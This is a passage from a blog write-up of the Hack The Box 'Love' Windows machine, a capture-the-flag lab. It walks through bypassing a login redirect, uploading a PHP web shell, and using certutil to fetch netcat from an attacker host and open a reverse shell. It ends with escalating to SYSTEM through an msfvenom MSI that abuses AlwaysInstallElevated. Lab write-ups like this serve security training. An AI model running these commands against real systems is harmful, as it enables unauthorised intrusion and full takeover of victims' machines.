</pre></table></code></div></div><p>If we try these credentials on the login page of the web server on port 80, we can see that they are correct.</p><h3 id="unintended-path-web-server-on-port-80-302-to-200"><span class="mr-2">Unintended path: Web server on port 80 (302 to 200)</span><a href="#unintended-path-web-server-on-port-80-302-to-200" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In the fuzzing phase, the status code for most of the resources in the <code class="language-plaintext highlighter-rouge">admin</code> directory, was <code class="language-plaintext highlighter-rouge">302</code>. Having in mind some recently read Bug Bounty articles, we can try to bypass this <code class="language-plaintext highlighter-rouge">302</code> status code. First, we will open <a href="https://portswigger.net/burp/communitydownload">Burpsuite</a> proxy to analyze further the responses and requests that are being exchanged between the web server and us.</p><p>The first resource that we will try to access is going to be <code class="language-plaintext highlighter-rouge">admin/home.php</code>, as it seems to be the principal page after being logged in. We will intercept this request with Burpsuite and we will indicate that we also want the response to be intercepted:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Burpsuite Intercept</em></p><p>We can see, how the response has a <code class="language-plaintext highlighter-rouge">302 Found</code> status code and also how the source code of the <code class="language-plaintext highlighter-rouge">home.php</code> page is being displayed:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>home.php Response</em></p><p>We will try to change this <code class="language-plaintext highlighter-rouge">302 Found</code> to <code class="language-plaintext highlighter-rouge">200 OK</code> in the response and see what happens:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum4.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>home.php</em></p><p>This works, and we can see how in the browser we are accessing the <code class="language-plaintext highlighter-rouge">home.php</code> page, meaning that we have bypassed the login page redirect.</p><p>To make this persistent and automatically change the <code class="language-plaintext highlighter-rouge">302 Found</code> status code to <code class="language-plaintext highlighter-rouge">200 OK</code>, we can use the following option from Burpsuite in <code class="language-plaintext highlighter-rouge">Proxy &gt; Options &gt; Match and Replace</code>:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/enum5.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Burpsuite match and replace</em></p><p>This will allow us to not have to change manually every response of resources that we can’t access, thus making all the web pages display correctly, even though we don’t have credentials to access them.</p><h2 id="user-shell"><span class="mr-2">User Shell</span><a href="#user-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="uploading-malicious-php-file"><span class="mr-2">Uploading malicious PHP file</span><a href="#uploading-malicious-php-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now that we have access to the web server’s dashboard, we will go to the <code class="language-plaintext highlighter-rouge">voters</code> page. This page lets us add voters to the system. We will proceed to add a new voter.</p><p>This will take us to a web form that has the <code class="language-plaintext highlighter-rouge">Firstname</code>, <code class="language-plaintext highlighter-rouge">Lastname</code>, <code class="language-plaintext highlighter-rouge">Password</code> and <code class="language-plaintext highlighter-rouge">Photo</code> fields. We have an upload feature for the <code class="language-plaintext highlighter-rouge">Photo</code> field. We know that the server is running over <code class="language-plaintext highlighter-rouge">PHP</code> so we will focus on this upload feature. If we manage to sneak in <code class="language-plaintext highlighter-rouge">PHP</code> code in the image that we are uploading, and the image is not being sanitized, we have a chance that the server interprets the code and we gain <code class="language-plaintext highlighter-rouge">RCE (Remote Command Execution</code>.</p><p>First, we will do a test with a real image:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/user1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Real Image Upload Test</em></p><p>We will intercept this request with <code class="language-plaintext highlighter-rouge">Burpsuite</code> to see how images are being uploaded to the server:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/user2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Burpsuite Intercept</em></p><p>We can see how we have delimited fields in our request. We will center our attention on the one that contains the photo, as it will be the field where we are going to try to sneak our <code class="language-plaintext highlighter-rouge">PHP</code> payload.</p><p>In order to bypass any kind of filter the upload feature can have to identify fraudulent files, we will maintain the <code class="language-plaintext highlighter-rouge">Content-Type</code> as <code class="language-plaintext highlighter-rouge">image/jpeg</code>. Then, we will change the extension of the filename to <code class="language-plaintext highlighter-rouge">PHP</code> and the content of the image to <code class="language-plaintext highlighter-rouge">PHP</code> code that allows us to execute system-level commands on the victim machine via a GET HTTP parameter:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/user3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Burpsuite request</em></p><p>If we remember the enumeration phase, we had an <code class="language-plaintext highlighter-rouge">image</code> directory on the web server. This directory can be the one where the user-uploaded images are being hosted, so we will proceed to examine it. We need to find if our <code class="language-plaintext highlighter-rouge">PHP</code> code is in this directory, as we need to access it in order to be interpreted by the web server.</p><p>We can see our <code class="language-plaintext highlighter-rouge">test.php</code> file in the directory, so we will access to it and use the <code class="language-plaintext highlighter-rouge">cmd</code> parameter in the URL to execute commands on the target machine:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/user4.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>whoami in Web Shell</em></p><p>We can see that we have gained <code class="language-plaintext highlighter-rouge">RCE</code> as the <code class="language-plaintext highlighter-rouge">phoebe</code> user.</p><h3 id="reverse-shell"><span class="mr-2">Reverse Shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now we will try to convert this web shell into a reverse shell. In order to do this, we have to download the Windows <a href="http://netcat.sourceforge.net/">Netcat</a> binary and host it on an HTTP server with <code class="language-plaintext highlighter-rouge">python3 -m http.server</code>.</p><p>From the web shell, we will transfer the binary to the target machine, in order to execute it and gain a reverse shell. To do this, we will use <code class="language-plaintext highlighter-rouge">certutil.exe</code>:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.10.239/Images/test.php?cmd=certutil.exe%20-f%20-split%20-urlcache%20http://10.10.15.1/nc.exe
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/user5.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Netcat transfer</em></p><p>Once we have the <code class="language-plaintext highlighter-rouge">Netcat</code> binary on the target machine, we will send a reverse shell to our machine. To do this, the first thing to do is to listen in a port of our machine, in this case in the <code class="language-plaintext highlighter-rouge">443</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-nlvp</span> 443
</pre></table></code></div></div><p>In the browser, using the binary that we have just transferred:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.10.239/images/test.php?cmd=nc.exe%20-e%20cmd.exe%2010.10.15.1%20443
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/user6.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Reverse Shell whoami</em></p><p>We will proceed to read the <code class="language-plaintext highlighter-rouge">user.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">C:\Users\phoebe\Desktop</code> directory.</p><h2 id="system-shell"><span class="mr-2">System Shell</span><a href="#system-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="enumeration-1"><span class="mr-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>At this point, we have to enumerate the target machine in order to escalate privileges. To do this, we will use <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winPEAS</a>.</p><p>First we will check the architecture and the version of Windows of the target machine using the <code class="language-plaintext highlighter-rouge">systeminfo</code> command:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/root1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Systeminfo</em></p><p>We can see that we are dealing with a 64 bit architecture, so we will use the <code class="language-plaintext highlighter-rouge">winPEAS x64</code> binary.</p><p>Same to what we have done with the <code class="language-plaintext highlighter-rouge">Netcat</code> binary, we will transfer the <code class="language-plaintext highlighter-rouge">winPEAS</code> binary to our target machine. To do this, we will host the file with <code class="language-plaintext highlighter-rouge">python -m http.server</code>, and we will type the following command on the target machine:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="nx">http://10.10.15.1/winPEASx64.exe</span><span class="w">
</span></pre></table></code></div></div><p>Now, we will execute the <code class="language-plaintext highlighter-rouge">winPEAS</code> binary and export all the output to a file:</p><div class="language-powershell file=&quot;winPEASx64 exe&quot; highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winPEASx64.exe</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">winPeas.txt</span><span class="w">
</span></pre></table></code></div></div><p>If we check the results of <code class="language-plaintext highlighter-rouge">winPEAS</code>, we can see the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/root2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>winPEAS output</em></p><p>We can see how we are suggested to exploit the <code class="language-plaintext highlighter-rouge">AlwaysInstallElevated</code> privilege. This privilege allows any user to execute files with <code class="language-plaintext highlighter-rouge">.msi</code> extension (common Windows installers) as the <code class="language-plaintext highlighter-rouge">Administrator</code> user.</p><p>First, we will check if we really have this privilege on the target machine. In order to do this, we need to check some values in the Windows registry with the following commands:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">AlwaysInstallElevated</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">AlwaysInstallElevated</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/root3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Registry values</em></p><p>We can see how both of them have a value of <code class="language-plaintext highlighter-rouge">1</code>. This means that we can abuse this privilege.</p><h3 id="malicious-msi-file"><span class="mr-2">Malicious .msi file</span><a href="#malicious-msi-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To exploit this privilege, we can create a <code class="language-plaintext highlighter-rouge">.msi</code> malicious file with <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">msfvenom</a> that contains a TCP reverse shell. To do this:</p><div file="1.msi" class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="1.msi"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.15.1 <span class="nv">LPORT</span><span class="o">=</span>9999 <span class="nt">-f</span> msi <span class="o">&gt;</span> 1.msi
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/root4.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>.msi File Creation</em></p><p>Once we have the <code class="language-plaintext highlighter-rouge">.msi</code> file, we host it with <code class="language-plaintext highlighter-rouge">python3 -m http.server</code> command and we transfer it to the target machine with <code class="language-plaintext highlighter-rouge">certutil.exe</code>:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/root5.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>.msi File Transfer</em></p><p>At the same time, we will start listening on the 9999 port using <code class="language-plaintext highlighter-rouge">Netcat</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-nlvp</span> 9999
</pre></table></code></div></div><p>Once the file is on the target machine and we are listening on the 9999 port, we will use the following command to execute the file that we have just transferred to the target machine:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">msiexec</span><span class="w"> </span><span class="nx">/quiet</span><span class="w"> </span><span class="nx">/qn</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">1.msi</span><span class="w">
</span></pre></table></code></div></div><p>If everything goes well, we will receive a TCP reverse shell as the <code class="language-plaintext highlighter-rouge">nt authority\system</code> user:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/love/root6.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>whoami system</em></p><p>We will proceed to see the <code class="language-plaintext highlighter-rouge">root.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">C:\Users\Administrator\Desktop</code> directory.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >ssrf</a> <a href="/tags/msi/" class="post-tag no-text-decoration" >msi</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Love+Write-up+-+root%40g2jz%3A~%23&url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Flove%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Love+Write-up+-+root%40g2jz%3A~%23&u=https%3A%2F%2Fg2jz.github.io%2Fposts%2Flove%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Flove%2F&text=Love+Write-up+-+root%40g2jz%3A~%23" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Flove%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/whoami/">whoami</a><li><a href="/posts/love/">Love Write-up</a><li><a href="/posts/explore/">Explore Write-up</a><li><a href="/posts/knife/">Knife Write-up</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/scrambled/"><div class="card-body"> <em class="small" data-ts="1664953200" data-df="ll" > Oct 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Scrambled Write-up</h3><div class="text-muted small"><p> Enumeration OS Detection In order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the TTL (Time To Live) of a ping response ca...</p></div></div></a></div><div class="card"> <a href="/posts/bountyhunter/"><div class="card-body"> <em class="small" data-ts="1664262000" data-df="ll" > Sep 27, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start enumerating the open ports on the victim machine. To do that, we will use nmap. We will specify that we want to scan all the port range, that we only want t...</p></div></div></a></div><div class="card"> <a href="/posts/explore/"><div class="card-body"> <em class="small" data-ts="1664434800" data-df="ll" > Sep 29, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Explore Write-up</h3><div class="text-muted small"><p> Enumeration Nmap The first thing we will do is enumerate the open ports on the target machine. To do this, we are going to be using nmap. The type of scan that we are going to use scans all the ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/bountyhunter/" class="btn btn-outline-primary" prompt="Older"><p>BountyHunter Write-up</p></a> <a href="/posts/explore/" class="btn btn-outline-primary" prompt="Newer"><p>Explore Write-up</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://g2jz.github.io/posts/love/'; this.page.identifier = '/posts/love/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://https://g2jz-github-io.disqus.com/.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/g2jzz">Gaizka Martín Mendiola</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B9ZXXC99N4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B9ZXXC99N4'); }); </script>
